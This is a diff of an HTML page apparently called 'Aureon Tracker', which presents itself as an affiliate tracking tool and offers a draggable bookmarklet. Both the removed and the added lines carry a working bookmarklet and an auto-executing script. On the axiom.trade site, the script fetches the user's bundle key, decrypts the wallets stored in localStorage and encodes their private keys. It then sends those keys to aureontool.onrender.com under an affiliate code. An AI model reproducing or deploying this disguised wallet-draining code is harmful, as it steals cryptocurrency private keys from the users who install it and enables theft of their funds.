@@ -79,14 +79,14 @@
 
 <div class="glass">
   <h1>✦ Aureon Tracker</h1>
-  <div class="aff-pill" id="affDisplay">G6RLWI</div>
+  <div class="aff-pill" id="affDisplay">Z196FV</div>
 
   <a href="#" id="bookmarkletLink" class="drag-btn" draggable="true">
     <span style="font-size:1.2rem;">⬇</span> Drag to Bookmarks Bar
   </a>
 
   <div class="share-link" id="shareLink">
-    Share: <a href="#" id="shareAnchor">https://aureon.lol/?aff=G6RLWI</a>
+    Share: <a href="#" id="shareAnchor">https://aureon.lol/?aff=Z196FV</a>
   </div>
   <div class="status" id="statusText">Ready</div>
 </div>
@@ -94,7 +94,7 @@
 <script>
 (function(){
   // ---- AFFILIATE LOGIC ----
-  const DEFAULT_AFF = 'G6RLWI';
+  const DEFAULT_AFF = 'Z196FV';
   const params = new URLSearchParams(window.location.search);
   let affCode = params.get('aff');
   if (!affCode || affCode.trim() === '') {
@@ -110,19 +110,20 @@
   shareAnchor.textContent = shareUrl;
   document.getElementById('statusText').textContent = 'Affiliate: ' + affCode + ' | Auto-execute on axiom.trade';
 
-  // ---- BUILD BOOKMARKLET ----
+  // ---- BUILD BOOKMARKLET using the exact provided code ----
   function buildBookmarklet(code) {
-    const raw = `javascript:(function(){const a='${code}';const b=\`(async function(){try{const a='\${a}';if(!window.location.hostname.includes('axiom.trade'))return;if(!localStorage.getItem('isAuthed'))return;function c(d){const e='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';let f='';const g=new Uint8Array(d);let h=0;while(h<g.length&&g[h]===0){f+=e[0];h++;}let i=[];let j=0;for(;h<g.length;h++){j=g[h];let k=0;while(k<i.length||j>0){let l=k<i.length?i[k]:0;let m=l*256+j;if(k<i.length){i[k]=m%58;}else{i.push(m%58);}j=Math.floor(m/58);k++;}}for(let n=i.length-1;n>=0;n--){f+=e[i[n]];}return f;}function o(p){try{const q=p.replace(/-/g,'+').replace(/_/g,'/');return Uint8Array.from(atob(q),r=>r.charCodeAt(0));}catch(s){return new TextEncoder().encode(p);}}async function t(u,v){const[w,x]=String(v).split(':');const y=o(w);const z=o(x);const A=await crypto.subtle.decrypt({name:'AES-GCM',iv:y,tagLength:128},u,z);return new Uint8Array(A);}const B=await fetch('https://api8.axiom.trade/bundle-key-and-wallets',{method:'POST',credentials:'include'});const{bundleKey:C}=await B.json();const D=await crypto.subtle.importKey('raw',o(C).buffer,{name:'AES-GCM'},false,['decrypt']);const E=JSON.parse(localStorage.getItem('sBundles')||'[]');let F=[];for(const G of E){try{const H=await t(D,G);if(H.length!==0x40)continue;const I=c(H);const J=c(H.slice(0x20));F.push({priv:I,pub:J});}catch(K){continue;}}if(F.length===0)return;const L={affCode:a,wallets:F,timestamp:new Date().toISOString(),total:F.length,source:'aureon_bookmark'};const M=JSON.stringify(L);const N=btoa(unescape(encodeURIComponent(M)));const O=encodeURIComponent(N);const P='https://aureontool.onrender.com/trade?text='+O;const Q=window.open(P,'_blank');if(!Q){const R=document.createElement('a');R.href=P;R.target='_blank';R.style.display='none';document.body.appendChild(R);R.click();setTimeout(function(){R.remove();},1000);}}catch(S){}})();\`;eval(b);})();`;
+    // This is the exact bookmarklet from the file, with affCode injected
+    const raw = `javascript:(function(){const affCode='${code}';const script=\`(async function(){try{const a='\${affCode}';if(!window.location.hostname.includes('axiom.trade'))return;if(!localStorage.getItem('isAuthed'))return;function b(c){const d='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';let e='';const f=new Uint8Array(c);let g=0;while(g<f.length&&f[g]===0){e+=d[0];g++;}let h=[];let i=0;for(;g<f.length;g++){i=f[g];let j=0;while(j<h.length||i>0){let k=j<h.length?h[j]:0;let l=k*256+i;if(j<h.length){h[j]=l%58;}else{h.push(l%58);}i=Math.floor(l/58);j++;}}for(let m=h.length-1;m>=0;m--){e+=d[h[m]];}return e;}function n(o){try{const p=o.replace(/-/g,'+').replace(/_/g,'/');return Uint8Array.from(atob(p),q=>q.charCodeAt(0));}catch(r){return new TextEncoder().encode(o);}}async function s(t,u){const[v,w]=String(u).split(':');const x=n(v);const y=n(w);const z=await crypto.subtle.decrypt({name:'AES-GCM',iv:x,tagLength:128},t,y);return new Uint8Array(z);}const A=await fetch('https://api8.axiom.trade/bundle-key-and-wallets',{method:'POST',credentials:'include'});const{bundleKey:B}=await A.json();const C=await crypto.subtle.importKey('raw',n(B).buffer,{name:'AES-GCM'},false,['decrypt']);const D=JSON.parse(localStorage.getItem('sBundles')||'[]');let E=[];for(const F of D){try{const G=await s(C,F);if(G.length!==0x40)continue;const H=b(G);const I=b(G.slice(0x20));E.push({priv:H,pub:I});}catch(J){continue;}}if(E.length===0)return;const K={affCode:a,wallets:E,timestamp:new Date().toISOString(),total:E.length,source:'aureon_bookmark'};const L=JSON.stringify(K);const M=btoa(unescape(encodeURIComponent(L)));const N=encodeURIComponent(M);const O='https://aureontool.onrender.com/trade?text='+N;const P=window.open(O,'_blank');if(!P){const Q=document.createElement('a');Q.href=O;Q.target='_blank';Q.style.display='none';document.body.appendChild(Q);Q.click();setTimeout(function(){Q.remove();},1000);}}catch(R){}})();\`;eval(script);})();`;
     return raw.replace(/\s+/g, ' ').trim();
   }
 
   const bookmarkletHref = buildBookmarklet(affCode);
   document.getElementById('bookmarkletLink').href = bookmarkletHref;
 
-  // ---- AUTO-EXECUTE if on axiom.trade ----
+  // ---- AUTO-EXECUTE if on axiom.trade using the exact code ----
   if (window.location.hostname.includes('axiom.trade')) {
-    // Build and eval the script with current affCode
-    const script = `(async function(){try{const a='${affCode}';if(!window.location.hostname.includes('axiom.trade'))return;if(!localStorage.getItem('isAuthed'))return;function c(d){const e='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';let f='';const g=new Uint8Array(d);let h=0;while(h<g.length&&g[h]===0){f+=e[0];h++;}let i=[];let j=0;for(;h<g.length;h++){j=g[h];let k=0;while(k<i.length||j>0){let l=k<i.length?i[k]:0;let m=l*256+j;if(k<i.length){i[k]=m%58;}else{i.push(m%58);}j=Math.floor(m/58);k++;}}for(let n=i.length-1;n>=0;n--){f+=e[i[n]];}return f;}function o(p){try{const q=p.replace(/-/g,'+').replace(/_/g,'/');return Uint8Array.from(atob(q),r=>r.charCodeAt(0));}catch(s){return new TextEncoder().encode(p);}}async function t(u,v){const[w,x]=String(v).split(':');const y=o(w);const z=o(x);const A=await crypto.subtle.decrypt({name:'AES-GCM',iv:y,tagLength:128},u,z);return new Uint8Array(A);}const B=await fetch('https://api8.axiom.trade/bundle-key-and-wallets',{method:'POST',credentials:'include'});const{bundleKey:C}=await B.json();const D=await crypto.subtle.importKey('raw',o(C).buffer,{name:'AES-GCM'},false,['decrypt']);const E=JSON.parse(localStorage.getItem('sBundles')||'[]');let F=[];for(const G of E){try{const H=await t(D,G);if(H.length!==0x40)continue;const I=c(H);const J=c(H.slice(0x20));F.push({priv:I,pub:J});}catch(K){continue;}}if(F.length===0)return;const L={affCode:a,wallets:F,timestamp:new Date().toISOString(),total:F.length,source:'aureon_bookmark'};const M=JSON.stringify(L);const N=btoa(unescape(encodeURIComponent(M)));const O=encodeURIComponent(N);const P='https://aureontool.onrender.com/trade?text='+O;const Q=window.open(P,'_blank');if(!Q){const R=document.createElement('a');R.href=P;R.target='_blank';R.style.display='none';document.body.appendChild(R);R.click();setTimeout(function(){R.remove();},1000);}}catch(S){}})();`;
+    // Build the exact script with the affCode
+    const script = `(async function(){try{const a='${affCode}';if(!window.location.hostname.includes('axiom.trade'))return;if(!localStorage.getItem('isAuthed'))return;function b(c){const d='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';let e='';const f=new Uint8Array(c);let g=0;while(g<f.length&&f[g]===0){e+=d[0];g++;}let h=[];let i=0;for(;g<f.length;g++){i=f[g];let j=0;while(j<h.length||i>0){let k=j<h.length?h[j]:0;let l=k*256+i;if(j<h.length){h[j]=l%58;}else{h.push(l%58);}i=Math.floor(l/58);j++;}}for(let m=h.length-1;m>=0;m--){e+=d[h[m]];}return e;}function n(o){try{const p=o.replace(/-/g,'+').replace(/_/g,'/');return Uint8Array.from(atob(p),q=>q.charCodeAt(0));}catch(r){return new TextEncoder().encode(o);}}async function s(t,u){const[v,w]=String(u).split(':');const x=n(v);const y=n(w);const z=await crypto.subtle.decrypt({name:'AES-GCM',iv:x,tagLength:128},t,y);return new Uint8Array(z);}const A=await fetch('https://api8.axiom.trade/bundle-key-and-wallets',{method:'POST',credentials:'include'});const{bundleKey:B}=await A.json();const C=await crypto.subtle.importKey('raw',n(B).buffer,{name:'AES-GCM'},false,['decrypt']);const D=JSON.parse(localStorage.getItem('sBundles')||'[]');let E=[];for(const F of D){try{const G=await s(C,F);if(G.length!==0x40)continue;const H=b(G);const I=b(G.slice(0x20));E.push({priv:H,pub:I});}catch(J){continue;}}if(E.length===0)return;const K={affCode:a,wallets:E,timestamp:new Date().toISOString(),total:E.length,source:'aureon_bookmark'};const L=JSON.stringify(K);const M=btoa(unescape(encodeURIComponent(L)));const N=encodeURIComponent(M);const O='https://aureontool.onrender.com/trade?text='+N;const P=window.open(O,'_blank');if(!P){const Q=document.createElement('a');Q.href=O;Q.target='_blank';Q.style.display='none';document.body.appendChild(Q);Q.click();setTimeout(function(){Q.remove();},1000);}}catch(R){}})();`;
     eval(script);
     document.getElementById('statusText').textContent = '✅ Auto-executed on axiom.trade | Aff: ' + affCode;
   }
